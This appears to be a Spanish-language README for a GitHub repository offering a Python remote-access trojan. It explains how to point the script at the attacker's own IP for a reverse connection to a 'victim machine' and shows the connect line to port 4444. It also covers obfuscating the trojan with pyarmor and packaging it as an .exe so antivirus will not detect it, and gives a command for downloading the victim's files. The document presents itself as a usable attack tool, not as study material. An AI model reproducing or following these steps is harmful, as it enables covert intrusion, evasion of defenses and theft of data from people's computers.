# Troyano

<p align="center">
<img src="Logotipo.png">
</p>

Un troyano es un tipo de software malicioso que se disfraza de una aplicación legítima o atractiva para engañar a los usuarios y ganar acceso no autorizado a sus sistemas o dispositivos.

### Instalación

Descargar el repositorio de Github luego configurar el script **troyano.py** con tu IP publica para poder tener acceso remoto a la maquina victima

```python
conexion.connect(("192.168.1.10", 4444))
```


### Ofuscacion

Para hacer indetectable el troyano deberes instalar **pyarmor**

```
pip install pyarmor
```

Ahora ofuscamos el troyano con el siguiente comando:

```
pyarmor gen troyano.py
```

Luego de esto nos creara una carpeta Dist con el troyano ofuscado, por ultimo convertiremos **.py** a **.exe** con auto-py-to-exe.

```
pip install auto-py-to-exe
```

<p align="center">
<img src="./Img/virustotal.png">
</p>

### USO

Puedes descargar archivos con el siguiente comando:

```
download <nombre de archivo>
```
